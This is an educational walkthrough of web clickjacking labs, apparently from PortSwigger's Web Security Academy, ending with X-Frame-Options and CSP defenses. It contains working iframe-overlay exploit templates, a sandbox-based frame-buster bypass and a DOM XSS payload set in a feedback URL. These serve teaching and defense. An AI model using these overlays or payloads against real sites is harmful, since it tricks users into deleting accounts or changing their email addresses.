# Clickjacking

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. Consider the following example:

A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content. This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.

### Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

**Solution:**
1. Log in to your account on the target website.
2. Go to the exploit server and paste the following HTML template into the **Body** section:
    ```
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
    ```
3. Make the following adjustments to the template:
   - Replace *YOUR-LAB-ID* in the iframe *src* attribute with your unique lab ID.
   - Substitute suitable pixel values for the *$height_value* and *$width_value* variables of the iframe (we suggest 700px and 500px respectively).
   - Substitute suitable pixel values for the *$top_value* and *$side_value* variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
   - Set the opacity value *$opacity* to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click **Store** and then **View exploit**.
5. Hover over **Test me** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. **Do not actually click the "Delete account" button yourself**. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
7. Click on **Deliver exploit to victim** and the lab should be solved.

## Clickjacking with prefilled form input
Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission. Other websites might require text before form submission. As GET values form part of the URL then the target URL can be modified to incorporate values of the attacker's choosing and the transparent "submit" button is overlaid on the decoy site as in the basic clickjacking example.

### Clickjacking with form input data prefilled from a URL parameter
This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

**Solution:**
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
    ```
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
3. Make the following adjustments to the template:
   - Replace *YOUR-LAB-ID* with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
   - Substitute suitable pixel values for the *$height_value* and *$width_value* variables of the iframe (we suggest 700px and 500px respectively).
   - Substitute suitable pixel values for the *$top_value* and *$side_value* variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).
   - Set the opacity value *$opacity* to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click **Store** and then **View exploit**.
5. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

## Frame busting scripts
Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

- check and enforce that the current application window is the main or top window,
- make all frames visible,
- prevent clicking on invisible frames,
- intercept and flag potential clickjacking attacks to the user.

Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe *sandbox* attribute. When this is set with the *allow-forms* or *allow-scripts* values and the *allow-top-navigation* value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

```<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>```

Both the *allow-forms* and *allow-scripts* values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

### Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

**Solution:**
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
    ```
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe sandbox="allow-forms"
    src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
3. Make the following adjustments to the template:
   - Replace *YOUR-LAB-ID* in the iframe *src* attribute with your unique lab ID so that the URL of the target website's user account page, which contains the "Update email" form.
   - Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
   - Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 385px and 80px respectively).
   - Set the opacity value *$opacity* to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
   Notice the use of the *sandbox="allow-forms"* attribute that neutralizes the frame buster script.
4. Click **Store** and then **View exploit**.
5. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

## Combining clickjacking with a DOM XSS attack

So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a DOM XSS attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the *print()* function.

**Solution:**
1. Go to the exploit server and paste the following HTML template into the **Body** section:
    ```
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe
    src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
    ```
2. Make the following adjustments to the template:
   - Replace *YOUR-LAB-ID* in the iframe src attribute with your unique lab ID so that the URL points to the target website's "Submit feedback" page.
   - Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
   - Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Submit feedback" button and the "Test me" decoy action align (we suggest 610px and 80px respectively).
   - Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
3. Click **Store** and then **View exploit**.
4. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
5. Click **Test me**. The print dialog should open.
6. Change "Test me" to "Click me" and click **Store** on the exploit server.
7. Now click on **Deliver exploit to victim** and the lab should be solved.

## Multistep clickjacking
Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.

### Multistep clickjacking
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

**Solution:**
1. Log in to your account on the target website and go to the user account page.
2. Go to the exploit server and paste the following HTML template into the "Body" section:
    ```
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
    .firstClick, .secondClick {
            position:absolute;
            top:$top_value1;
            left:$side_value1;
            z-index: 1;
        }
    .secondClick {
            top:$top_value2;
            left:$side_value2;
        }
    </style>
    <div class="firstClick">Test me first</div>
    <div class="secondClick">Test me next</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
    ```
3. Make the following adjustments to the template:
- Replace *YOUR-LAB-ID* with your unique lab ID so that URL points to the target website's user account page.
- Substitute suitable pixel values for the *$width_value* and *$height_value* variables of the iframe (we suggest 500px and 700px respectively).
- Substitute suitable pixel values for the *$top_value1* and *$side_value1* variables of the decoy web content so that the "Delete account" button and the "Test me first" decoy action align (we suggest 330px and 50px respectively).
- Substitute a suitable value for the *$top_value2* and *$side_value2* variables so that the "Test me next" decoy action aligns with the "Yes" button on the confirmation page (we suggest 285px and 225px respectively).
- Set the opacity value *$opacity* to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click **Store** and then **View exploit**.
5. Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet.
6. Click **Test me first** then hover over **Test me next** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet.
7. Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click **Store** on the exploit server.
8. Now click on **Deliver exploit to victim** and the lab should be solved.

## How to prevent clickjacking attacks

Clickjacking is a browser-side behavior and its success or otherwise depends upon browser functionality and conformity to prevailing web standards and best practice. Server-side protection against clickjacking is provided by defining and communicating constraints over the use of components such as iframes. However, implementation of protection depends upon browser compliance and enforcement of these constraints. Two mechanisms for server-side clickjacking protection are X-Frame-Options and Content Security Policy.

## X-Frame-Options
X-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers. The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the *deny* directive:
```X-Frame-Options: deny```

Alternatively, framing can be restricted to the same origin as the website using the *sameorigin* directive
```X-Frame-Options: sameorigin```

or to a named website using the allow-from directive:
```X-Frame-Options: allow-from https://normal-website.com```

X-Frame-Options is not implemented consistently across browsers (the *allow-from* directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.

## Content Security Policy (CSP)
Content Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the web server as a return header of the form:
```Content-Security-Policy: policy```

where policy is a string of policy directives separated by semicolons. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.

The recommended clickjacking protection is to incorporate the *frame-ancestors* directive in the application's Content Security Policy. The *frame-ancestors 'none'* directive is similar in behavior to the X-Frame-Options deny directive. The *frame-ancestors 'self'* directive is broadly equivalent to the X-Frame-Options *sameorigin* directive. The following CSP whitelists frames to the same domain only:
```Content-Security-Policy: frame-ancestors 'self';```

Alternatively, framing can be restricted to named sites:
```Content-Security-Policy: frame-ancestors normal-website.com;```

To be effective against clickjacking and XSS, CSPs need careful development, implementation and testing and should be used as part of a multi-layer defense strategy.